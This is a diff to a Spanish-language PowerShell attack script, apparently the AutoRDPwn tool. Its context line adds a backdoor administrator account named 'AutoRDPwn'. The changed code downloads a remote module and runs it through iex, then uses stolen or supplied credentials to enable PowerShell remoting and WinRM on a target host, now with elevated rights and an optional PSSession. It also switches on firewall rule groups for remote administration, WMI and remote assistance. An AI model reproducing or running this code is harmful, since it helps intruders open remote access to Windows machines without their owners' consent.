@@ -126,12 +126,19 @@ $Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDP
         $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
         $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
         Write-Host ""
+        $pssession = Read-Host -Prompt 'Quieres conectarte a través de PSSession?'
+        Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
-	(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs.psm1") | iex
-        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" }
-        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Administración Remota de servicios' new enable=yes ; netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes" }
-        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes" }
-        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes" }}
+        (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs.psm1") | iex
+        if($pssession -like 's') { $PSSession = New-PSSession -Computer $computer -credential $credential
+        Invoke-CommandAs -Session $PSSession -ScriptBlock { powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" } -RunElevated
+        Invoke-CommandAs -Session $PSSession -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Administración Remota de servicios' new enable=yes ; netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes" } -RunElevated
+        Invoke-CommandAs -Session $PSSession -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes" } -RunElevated
+        Invoke-CommandAs -Session $PSSession -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes" } -RunElevated} else {
+	Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" } -RunElevated
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Administración Remota de servicios' new enable=yes ; netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes" } -RunElevated
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes" } -RunElevated
+        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule group='Administración remota de Windows' new enable=yes" } -RunElevated }}
 
         '5' {
         Write-Host ""
